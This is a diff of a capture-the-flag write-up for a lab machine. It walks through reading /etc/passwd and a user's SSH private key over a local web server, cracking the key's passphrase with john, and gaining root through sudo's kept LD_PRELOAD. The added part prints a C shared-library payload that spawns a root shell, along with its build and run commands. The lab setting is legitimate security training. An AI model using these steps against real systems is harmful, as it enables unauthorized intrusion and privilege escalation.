@@ -158,27 +158,23 @@ So to that manually.
 
 Its giving directory listing for / but if I click any of that directories I get 404. So we need to manually write the endpoint like /etc/passwd
 
-
 ```text
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash 
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
 ```
 
-Which gave me output. 
-
+Which gave me output.
 
 Now try looking for any ssh keys.
-
 
 If you go to `http://127.0.0.1:1337/home/saad/.ssh/id_rsa`
 
 You can get ssh private key for saad.
 
-
 ```bash
 ❯ nvim saad.key
 ❯ chmod 400 saad.key
 ❯ ssh saad@$IP -i saad.key
-Enter passphrase for key 'saad.key': 
+Enter passphrase for key 'saad.key':
 ```
 
 Now we need to crack the ssh key password using `john`
@@ -188,7 +184,7 @@ python2 ssh2john.py saad.key > saad_ssh.hash
 ```
 
 ```bash
-❯ john hashes/ssh.hash --wordlist=rockyou.txt 
+❯ john hashes/ssh.hash --wordlist=rockyou.txt
 Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
 Use the "--format=ssh-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -203,10 +199,113 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 Which gave the password to log in.
 
-
 ```bash
 saad@ip-10-10-86-65:~$ ls
 snap  start_server.py  user.txt
-saad@ip-10-10-86-65:~$ cat user.txt 
+saad@ip-10-10-86-65:~$ cat user.txt
 *********************************
+```
+
+```bash
+saad@ip-10-10-86-65:~$ ls -la
+total 52
+drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
+drwxr-xr-x 4 root root 4096 Jul 11 10:00 ..
+-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
+-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
+drwx------ 2 saad saad 4096 Jan 20  2023 .cache
+drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
+drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
+-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
+drwx------ 3 saad saad 4096 Jan 20  2023 snap
+drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
+-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
+-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
+-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
+```
+
+bash history is not symlinked to /dev/null what
+
+```bash
+saad@ip-10-10-86-65:~$ cat .bash_history
+echo "saad:************************" > creds.txt
+ssh root@192.169.155.104
+mysql -u user -p
+mysql -u db_user -p
+ls -ld /var/lib/mysql
+ls -al
+cat .bash_history
+cat .bash_logout
+nano .bashrc
+ls -al
+```
+
+We can see that bro forgot to remove the bash history.
+
+Lets sudo -l
+
+```bash
+saad@ip-10-10-86-65:~$ sudo -l
+[sudo] password for saad:
+Matching Defaults entries for saad on ip-10-10-86-65:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User saad may run the following commands on ip-10-10-86-65:
+    (root) /usr/bin/ping
+```
+
+env_keep+=LD_PRELOAD we can use this to priv escalate
+
+Look at this articles:
+
+[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
+
+[LD_PRELOAD and Dynamic Library Hijacking in Linux | by Hem Parekh | Medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)
+
+```bash
+saad@ip-10-10-86-65:/tmp$ vim shell.c
+```
+
+Add these lines:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+```
+
+```bash
+saad@ip-10-10-86-65:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+shell.c: In function ‘_init’:
+shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    6 | setgid(0);
+      | ^~~~~~
+shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    7 | setuid(0);
+      | ^~~~~~
+saad@ip-10-10-86-65:/tmp$ ls -la shell.so
+total 68
+-rwxrwxr-x  1 saad saad 14760 Jul 11 12:19 shell.so
+saad@ip-10-10-86-65:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
+whoami
+root
+```
+
+And we are root:
+
+```bash
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+*****************************
 ```
